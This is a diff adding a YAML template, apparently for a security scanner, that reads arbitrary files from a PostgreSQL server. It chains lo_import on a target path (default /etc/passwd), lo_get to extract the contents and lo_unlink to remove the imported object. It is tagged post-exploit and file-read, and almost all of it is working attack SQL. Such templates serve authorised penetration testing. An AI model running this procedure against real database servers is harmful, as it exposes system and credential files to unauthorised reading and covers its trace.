@@ -1,0 +1,34 @@
+id: postgresql-large-object-read
+service: [postgresql]
+variables:
+  target_file: /etc/passwd
+info:
+  name: PostgreSQL Large Object File Read
+  severity: high
+  tags: postgresql,post-exploit,file-read
+
+services:
+  - ops:
+      - db: "SELECT 'oid=' || lo_import('{{target_file}}')"
+        name: import_result
+    extractors:
+      - type: regex
+        name: lo_oid
+        internal: true
+        part: import_result
+        regex: ['(?m)^oid=(\d+)']
+        group: 1
+
+  - ops:
+      - db: "SELECT 'content=' || encode(lo_get({{lo_oid}}), 'escape')"
+        name: file_content
+      - db: "SELECT lo_unlink({{lo_oid}})"
+    matchers:
+      - type: word
+        part: file_content
+        words: ["content="]
+    extractors:
+      - type: regex
+        name: postgresql_file_content
+        part: file_content
+        regex: ['(?m)^content=(.+)$']
